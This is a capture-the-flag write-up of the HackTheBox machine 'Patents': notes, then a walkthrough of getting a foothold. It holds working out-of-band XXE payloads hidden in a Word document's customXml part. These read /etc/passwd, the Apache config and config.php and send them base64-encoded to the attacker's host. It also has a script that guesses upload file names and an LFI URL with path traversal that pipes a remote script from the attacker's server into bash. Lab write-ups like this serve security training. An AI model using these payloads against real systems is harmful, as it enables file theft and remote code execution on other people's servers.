Patents is a 40-point Linux machine on HackTheBox. For user we exploit an external entity injection in a word document and a local file inclusion that involves path traversal and calculating the name of an uploaded file. For root we use return oriented programming to exploit a stack overflow in a tcp server.

Notes
customXml\item1.xml:

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.14.8:8000/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
dtd.xml:

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.8:8000/dtd.xml?%data;'>">
Rce.py:

#!/usr/bin/python3
import hashlib
import datetime
import requests
import time
 
proxyDict = { 
              "http"  : "127.0.0.1:8081", 
            }
 
result = requests.get("http://patents.htb")
dateHdr = result.headers['Date']
t = datetime.datetime.strptime(dateHdr, '%a, %d %b %Y %H:%M:%S GMT')
t -= datetime.timedelta(minutes=5)
it = int(t.timestamp())
 
 
while True: 
    url = f"http://patents.htb/uploads/{hashlib.sha256(b'xct.php' + str(it).encode('utf-8')).hexdigest()}.docx"
    r = requests.get(url)#, proxies=proxyDict)
    if r.status_code == 200:
        print(it)
        print(url)
    it += 1
LFI:

http://patents.htb/getPatent_alphav1.0.php?id=..././uploads/<id>.docx&cmd=curl%2010.10.14.8:8000/xct.sh%20|%20bash
The Root Exploit.

Reads
https://blogs.sap.com/2017/04/24/openxml-in-word-processing-custom-xml-part-mapping-flat-data/
https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440
https://github.com/Svenito/exploit-pattern
  
  
##
##
##
  
  
  
Patents was quite a difficult box from gb.yolo (who's now a teammate of mine!) with a realistic pwn in the end.  Overall, it was a very enjoyable box that took a while!  Before I start, I would like to thank D3v17 and pottm, my teammates who worked with me on this box.  Additionally, I would like to thank oep, Sp3eD, R4J, and Deimos who I also colloborated with at times throughout the box and discussed with afterwards.

On the initial nmap scan, we see port 22, 80, and 8888.  Port 8888 seems to be a web server, but none of the browsers would work with it and it mentions something about LFM... I wasn't too sure what this was so I ended up focusing all my efforts on the port 80 webpage.


After a while, I ended up retrieving a lot of enumerated folders back with dirb and gobuster.  None of them really showed anything insightful, and I tried around with XXEs and other possible attack vectors against this document to pdf conversion as it allowed us to upload docx files to convert into pdf files.  I ended up going back to more enumeration to see if anything else more insightful would appear, using different wordlists from seclist.

After a few more hours, the following showed up from Discovery/Web-Content/raft-large-words.txt in the release subdirectory in dirb: http://parent.htb/release/UpdateDetails

It showed the following details:

As Sp3ed mentioned to me, the author keeps mentioning a custom folder and entity parsing there.  Googling around, you can find several references to a customXML part or folder in word documents.  Perhaps this is where we can utilize the XXE!

Starting off, I just created a fresh new word document (you can download samples here: https://file-examples.com/index.php/sample-documents-download/sample-doc-download/) and unzipped the internals, then added a customXML folder.  This SO post also revealed some important information by mentioning how the format within this part should be item#.xml: https://stackoverflow.com/questions/38789361/vsto-word-2013-add-in-add-custom-xml-to-document-xml-without-it-being-visible

Quoting the post:
"The item#.xml files are where custom XML get stored, and it's the only way to store complex data in a Word document without it being a part of the document content. Another program can read it pretty easily, typically using the OpenXML SDK.
So you're doing the right thing here, but whatever software needs to read this needs to look in the customXml folder for that item#.xml file, instead of the word/document.xml file. It will have to look for the namespace you defined."

In that file, I tried some different XXE payloads from here, then remade it into a docx and uploaded it: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-dtd-and-php-filter

After a few different payloads, I figured that this is an out of band XXE (hence the link above): https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

This went into the item1.xml file.

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.14.6/evil.xml">
%sp;
%param1;
]>
<r>&exfil;</r>

On my local side, I hosted an http server with the evil.xml dtd (the base64 helps make the data exfiltration easier):

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.6/hahagotcha?%data;'>">

I ended up getting a response pretty quickly:


Basically, the xml parser requests the dtd file hosted on my side, which then tells it to load the target file and then send the data in the form of base64 encoded data back to me.  Anyways, let's try to get some useful information!  Turns out looking at vhost data can provide some interesting insight!  I thought vhost because none of the other files dirb/gobuster found seemed to be able to be exfiltrated.

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/sites-available/000-default.conf">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.6/hahagotcha?%data;'>">

After base64 decoding the output, we see the following:

<VirtualHost *:80>
  DocumentRoot /var/www/html/docx2pdf

  <Directory /var/www/html/docx2pdf/>
      Options -Indexes +FollowSymLinks +MultiViews
      AllowOverride All
      Order deny,allow
      Allow from all
  </Directory>

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

Ah, so the root dir for this web server is at docx2pdf!  Now, taking a look at config.php:

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/docx2pdf/config.php">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.6/hahagotcha?%data;'>">

Here's the decoded result:

<?php
# needed by convert.php
$uploadir = 'letsgo/';

# needed by getPatent.php
# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable
define('PATENTS_DIR', '/patents/');
?>



##
##
  
